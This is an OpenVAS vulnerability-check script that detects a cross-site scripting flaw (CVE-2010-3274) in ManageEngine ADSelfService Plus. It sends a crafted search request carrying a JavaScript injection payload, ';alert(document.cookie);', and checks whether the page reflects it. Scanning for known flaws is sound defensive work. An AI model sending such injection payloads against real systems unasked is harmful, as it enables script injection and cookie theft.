###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_manageengine_adself_service_plus_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Zoho ManageEngine ADSelfService Plus Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to terminate javascript
  variable declarations, escape encapsulation, and append arbitrary javascript
  code.
  Impact Level: Application";
tag_affected = "ManageEngine ADSelfServicePlus version 4.5 Build 4521";
tag_insight = "The flaw is due to an error in corporate directory search feature, which
  allows remote attackers to cause XSS attacks.";
tag_solution = "No solution or patch is available as of 18th, November 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.manageengine.co.in/products/self-service-password/download.html";
tag_summary = "This host is running Zoho ManageEngine ADSelfService Plus and is
  prone to cross site scripting vulnerability.";

if(description)
{
  script_id(902757);
  script_version("$Revision: 13 $");
  script_cve_id("CVE-2010-3274");
  script_bugtraq_id(50717);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-11-18 11:15:15 +0530 (Fri, 18 Nov 2011)");
  script_name("Zoho ManageEngine ADSelfService Plus Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/520562");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/107093/vrpth-2011-001.txt");

  script_description(desc);
  script_summary("Check if Zoho ManageEngine ADSelfService Plus is prone to XSS");
  script_category(ACT_GATHER_INFO);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:8888);
if(!get_port_state(port)) {
  exit(0);
}

foreach dir (make_list("/", "/manageengine", cgi_dirs()))
{
  sndReq = http_get(item:string(dir , "/EmployeeSearch.cc"), port:port);
  rcvRes = http_send_recv(port:port, data:sndReq);

  ## Confirm the application
  if("<title>ManageEngine - ADSelfService Plus</title>" >< rcvRes)
  {
    ## Construct attack
    url = string (dir + '/EmployeeSearch.cc?searchType=contains&searchBy=' +
                    'ALL_FIELDS&searchString=";alert(document.cookie);"');

    ## Confirm exploit worked properly or not
    if(http_vuln_check(port:port, url:url, pattern:";alert\(document.cookie\);"))
    {
      security_warning(port:port);
      exit(0);
    }
  }
}
